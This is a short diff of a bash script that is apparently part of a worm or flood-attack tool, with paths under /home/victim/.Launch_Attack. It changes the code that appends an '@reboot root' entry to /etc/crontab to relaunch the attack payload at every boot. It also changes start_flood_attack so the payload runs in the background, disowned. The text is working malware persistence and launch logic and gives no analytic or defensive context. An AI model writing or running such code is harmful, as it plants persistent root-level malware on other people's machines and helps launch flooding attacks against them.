@@ -11,7 +11,6 @@
 
 readonly ldir="/home/victim/.Launch_Attack"
 readonly lfname="Launching_Attack"
-readonly attack_start_ins="cd '$ldir' && [ -f '$ldir/$lfname' ] && './$lfname'"
 
 tamper_crontab() {
     local crtbpath="/etc/crontab"
@@ -21,7 +20,7 @@ tamper_crontab() {
         return 0
     fi
 
-    if  echo "@reboot root $attack_start_ins" >> $crtbpath; then
+    if  echo "@reboot root cd '$ldir' && [ -f '$ldir/$lfname' ] && './$lfname'" >> $crtbpath; then
         echo "Corntab tampered."
         return 0
     else
@@ -60,7 +59,7 @@ distribute_worm_launcher(){
 }
 
 start_flood_attack(){
-    ${attack_Start_ins} 2> /dev/null
+    $ldir/$lfname 2> /dev/null & disown
 }
 
 parent_path=$( cd "$(dirname "${BASH_SOURCE[0]}")" ; pwd -P )
